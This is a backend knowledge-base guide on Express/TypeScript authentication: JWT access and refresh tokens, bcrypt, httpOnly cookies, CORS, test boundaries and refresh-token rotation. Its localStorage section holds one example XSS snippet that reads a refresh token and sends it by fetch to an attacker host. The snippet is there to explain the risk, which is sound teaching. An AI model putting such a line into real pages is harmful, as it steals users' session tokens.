# Authentication & Security

**Category:** Backend Development  
**Last Updated:** 2026-08-02  
**Epic 13 Reference:** [Story 13.3 Authentication](../../issue-implementation/epic-13-production-backend-architecture/story-13-3-authentication.md)

## TL;DR Quick Reference

```bash
# Install
npm install jsonwebtoken bcrypt cookie-parser

# Pattern: Access token (15min) + Refresh token (7 days, httpOnly cookie)
# Security: bcrypt cost 10, JWT rotation on refresh, HTTPS-only in prod
```

---

## JWT Authentication (Access + Refresh Tokens)

**Use Case:** Multi-session, cross-device auth for SPA + mobile  
**Security:** Stateless, revocable via token rotation

### Minimal Example

```typescript
// 1. Install
npm install jsonwebtoken bcrypt
npm install -D @types/jsonwebtoken @types/bcrypt
```

#### Controller Layer

Authentication endpoints are handled by controllers in `modules/auth/api/AuthController.ts`. Controllers are thin — they parse the request, delegate to the service, and format the response.

```typescript
// authController.ts
import { Request, Response } from "express";
import { AuthService } from "../services/AuthService.js";

export class AuthController {
  constructor(private readonly authService: AuthService) {}

  async login(req: Request, res: Response) {
    const { email, password } = req.body;
    const { user, accessToken, refreshToken } = await this.authService.login(email, password);

    res.cookie("refreshToken", refreshToken, {
      httpOnly: true,
      secure: process.env.NODE_ENV === "production",
      sameSite: process.env.NODE_ENV === "production" ? "strict" : "lax",
      path: "/",
      maxAge: 7 * 24 * 60 * 60 * 1000,
    });

    res.json({ accessToken, user: { id: user.id, email: user.email } });
  }

  async refresh(req: Request, res: Response) {
    const refreshToken = req.cookies.refreshToken;
    const tokens = await this.authService.refresh(refreshToken);
    res.json(tokens);
  }
}
```

#### Service Layer

Business logic lives in services, never in controllers. Services use repositories for data access, and infrastructure services (JwtService, PasswordService) for security operations.

```typescript
// AuthService.ts
import { UserRepository } from "../repositories/UserRepository.js";
import { JwtService } from "../../../shared/infrastructure/security/JwtService.js";
import { PasswordService } from "../../../shared/infrastructure/security/PasswordService.js";

export class AuthService {
  constructor(
    private readonly userRepository: UserRepository,
    private readonly jwtService: JwtService,
    private readonly passwordService: PasswordService,
  ) {}

  async login(email: string, password: string) {
    const user = await this.userRepository.findByEmail(email);
    if (!user) {
      throw new AuthError("Invalid credentials", 401);
    }

    const valid = await this.passwordService.verify(password, user.password);
    if (!valid) {
      throw new AuthError("Invalid credentials", 401);
    }

    const accessToken = this.jwtService.sign({ userId: user.id, email: user.email }, "15m");
    const refreshToken = this.jwtService.signRefresh({ userId: user.id }, "7d");

    return { user, accessToken, refreshToken };
  }

  async refresh(refreshToken: string) {
    const decoded = this.jwtService.verifyRefresh(refreshToken);
    const accessToken = this.jwtService.sign({ userId: decoded.userId }, "15m");
    return { accessToken };
  }
}
```

#### Repository Layer

Data access is handled by repositories, never directly in services or controllers.

```typescript
// UserRepository.ts
export class UserRepository {
  constructor(private readonly prisma: PrismaClient) {}

  async findByEmail(email: string) {
    return this.prisma.user.findUnique({ where: { email } });
  }
}
```

---

## Security Service Testing Boundaries

**Category:** Security & Testing  
**Context:** Deciding what to mock in JWT/Password services

When unit testing security infrastructure (like a `JwtService` or `PasswordService`), a critical architectural decision is whether to mock the underlying libraries (`jsonwebtoken`, `bcrypt`).

### To Mock or Not to Mock?

| Dependency         | Recommendation      | Reason                                                                                                                                                                                   |
| :----------------- | :------------------ | :--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| **Bcrypt**         | **DO NOT MOCK**     | The utility of the test is verifying that the hashing and comparison logic works with real algorithms. Mocking `bcrypt.hash` to return `"fixed_string"` defeats the purpose of the test. |
| **JWT Library**    | **DO NOT MOCK**     | You need to verify that tokens created by the service are actually parsable and have the correct expiration/claims.                                                                      |
| **Key Management** | **MOCK ENV/SECRET** | Do not use production secrets. Provide test-specific secrets via dependency injection or a `.env.test` file.                                                                             |

### The "Cost Factor" Tradeoff

Using real `bcrypt` in tests comes with a performance penalty. Bcrypt is designed to be slow.

- **Struggle**: Running 20+ password tests can add ~1s to the test suite.
- **Solution**: For **unit tests** specifically, you can reduce the salt rounds (e.g., `rounds: 1`) in test environment to speed up execution, while keeping higher rounds for integration/production environments.

### Boundary Checklist

1.  Verify the service correctly handles **expired** tokens.
2.  Verify the service rejects tokens signed with the **wrong secret**.
3.  Verify the password validator rejects **common/weak** passwords.
4.  Verify that sanitization logic (e.g., `sanitizeUser`) actually removes the hashed password from the object.

---

### httpOnly Cookies for Refresh Tokens (XSS Protection)

**When Adopted:** Epic 13 Story 13.3  
**Why:** Protect refresh tokens from XSS attacks; not accessible to JavaScript  
**Use Case:** Production-grade authentication security

#### Problem with localStorage

Storing refresh tokens in localStorage exposes them to XSS attacks:

```javascript
// BAD: Vulnerable to XSS
localStorage.setItem("refreshToken", token);

// Malicious script can steal token:
const stolen = localStorage.getItem("refreshToken");
fetch("https://attacker.com/steal", { body: stolen });
```

#### Solution: httpOnly Cookies

Store refresh tokens in httpOnly cookies (backend sets, JavaScript cannot access). The controller handles cookie setting while the service handles business logic:

```typescript
// AuthController.ts — Sets httpOnly cookie, delegates to service
async login(req: Request, res: Response) {
  const { email, password } = req.body;

  const { user, accessToken, refreshToken } = await this.authService.login(email, password);

  // Set refresh token as httpOnly cookie
  res.cookie("refreshToken", refreshToken, {
    httpOnly: true, // Cannot be accessed by JavaScript
    secure: process.env.NODE_ENV === "production", // HTTPS-only in production
    sameSite: process.env.NODE_ENV === "production" ? "strict" : "lax", // CSRF protection
    path: "/", // Available to all routes
    maxAge: 7 * 24 * 60 * 60 * 1000, // 7 days
  });

  // Return only access token (short-lived, can be in memory)
  res.json({
    accessToken, // Frontend stores this in memory (15min expiry = low risk)
    user: { id: user.id, email: user.email },
  });
}

// AuthController.ts — Reads refresh token from cookie
async refresh(req: Request, res: Response) {
  const refreshToken = req.cookies.refreshToken; // Read from cookie

  if (!refreshToken) {
    return res.status(401).json({ error: "No refresh token" });
  }

  const tokens = await this.authService.refresh(refreshToken);
  res.json(tokens);
}
```

#### Frontend Configuration

Frontend must include credentials in requests:

```typescript
// Frontend: All auth requests must include credentials
fetch("/api/v1/auth/login", {
  method: "POST",
  headers: { "Content-Type": "application/json" },
  credentials: "include", // REQUIRED: Send cookies with request
  body: JSON.stringify({ email, password }),
});

// OR: Configure fetch wrapper
async function authFetch(url: string, options: RequestInit = {}) {
  return fetch(url, {
    ...options,
    credentials: "include", // Always include cookies
  });
}
```

#### Backend CORS Configuration

CORS must allow credentials and specify origin (no wildcard). CORS is applied once at the app level in `app/index.ts`:

```typescript
import cors from "cors";

// REQUIRED: Specific origin + credentials
app.use(
  cors({
    origin: process.env.FRONTEND_URL || "http://localhost:5173", // Specific origin (not *)
    credentials: true, // Allow cookies
    methods: ["GET", "POST", "PUT", "DELETE", "OPTIONS"],
    allowedHeaders: ["Content-Type", "Authorization"],
  }),
);

// MUST install cookie-parser middleware
import cookieParser from "cookie-parser";
app.use(cookieParser());
```

#### Environment-Aware sameSite (Development Proxy)

Development proxy (e.g., Vite localhost:5173 → localhost:3001) requires `sameSite: "lax"`:

```javascript
// Helper function for environment-aware cookie config
const setRefreshTokenCookie = (res, token) => {
  res.cookie("refreshToken", token, {
    httpOnly: true,
    secure: process.env.NODE_ENV === "production",
    // Development: "lax" allows dev proxy (localhost:5173 → localhost:3001)
    // Production: "strict" for maximum security
    sameSite: process.env.NODE_ENV === "production" ? "strict" : "lax",
    path: "/",
    maxAge: 7 * 24 * 60 * 60 * 1000,
  });
};

// Usage
setRefreshTokenCookie(res, refreshToken);
```

#### Cookie Clearing (Logout)

Clearing cookies requires **exact matching options**. This is done in the controller:

```typescript
// AuthController.ts
async logout(req: Request, res: Response) {
  const refreshToken = req.cookies.refreshToken;
  await this.authService.logout(refreshToken);

  // Clear cookie with EXACT matching options
  res.clearCookie("refreshToken", {
    httpOnly: true,
    secure: process.env.NODE_ENV === "production",
    sameSite: process.env.NODE_ENV === "production" ? "strict" : "lax",
    path: "/", // MUST match original cookie path
  });

  res.json({ success: true });
}
```

#### Key Security Benefits

- **XSS Protection**: Refresh token inaccessible to JavaScript (even if attacker injects script)
- **CSRF Protection**: `sameSite: strict` prevents cross-site request forgery
- **Secure Transport**: `secure: true` ensures cookies only sent over HTTPS in production
- **Short-Lived Access Tokens**: Even if access token stolen from localStorage, expires in 15min
- **Token Rotation**: Delete old refresh token on refresh (limits damage if stolen)

### Key Lessons

- Short-lived access tokens (15min), long-lived refresh (7d)
- Never store passwords in plain text
- Use bcrypt rounds: 10 for dev, 12+ for production
- Rotate refresh tokens on use (optional but secure)
- Store JWT secrets in environment variables
- Use httpOnly cookies for refresh tokens (XSS protection)
- sameSite "lax" for dev proxy, "strict" for production (environment-aware)
- Cookie clear options must match set options (especially path)
- CORS with credentials requires specific origin (never wildcard)
- Frontend must use credentials: 'include' (send cookies)

### When to Use

User authentication, API access control, mobile apps, production web apps requiring XSS protection

---

## Refresh Token Rotation & Concurrent Refresh

**When Adopted:** Epic 21 (F4 — session refresh race)
**Why:** Refresh tokens are **single-use** — every refresh deletes the old session, so concurrent refreshes with the same cookie race.

### Token rotation on the backend

`AuthService.refresh(refreshToken)` verifies the JWT **and** that the session still exists in the database, then deletes the old session before issuing new tokens:

```typescript
// AuthService.refresh (simplified)
const payload = this.jwtService.verifyRefreshToken(refreshToken);
const session = await this.repository.findSessionByToken(refreshToken);
if (!session) throw new Error("Invalid refresh token");

// Delete old session (token rotation) — the token is now single-use
await this.repository.deleteSession(session.id);
// ... issue new access + refresh tokens, store the new session
```

`logout` invalidates by deleting every session matching the token (`deleteSessionsByToken`).

### Why concurrent refreshes race

Because each use **deletes** the old `Session` row, two concurrent `POST /auth/refresh` calls with the same cookie can both pass verification; the first deletes the session, and the second finds nothing → `401 INVALID_TOKEN`. Without coalescing on the client, that losing request is treated as fatal and the user is wrongly logged out.

### The fix is client-side single-flight

The backend must keep rotating (single-use) tokens. The **frontend** is responsible for coalescing every refresh path into one in-flight request — see [Single-Flight Across ALL Refresh Paths](../frontend/frontend-advanced-patterns.md#single-flight-across-all-refresh-paths-epic-21--f4) in the frontend patterns KB.

### Key Lessons

- Refresh tokens are single-use — delete the old `Session` row on every refresh (rotation limits damage if a token is stolen).
- Concurrent refreshes with the same cookie are a real race; the client MUST single-flight them.
- Backend rotation + client single-flight together prevent spurious `401 INVALID_TOKEN` logouts.

---

**Related Guides:**

- [Backend Architecture](./backend-architecture.md) — Auth middleware integration
- [Database & ORM](./backend-database-postgres.md) — User model design
- [Advanced React Patterns (frontend refresh single-flight)](../frontend/frontend-advanced-patterns.md)
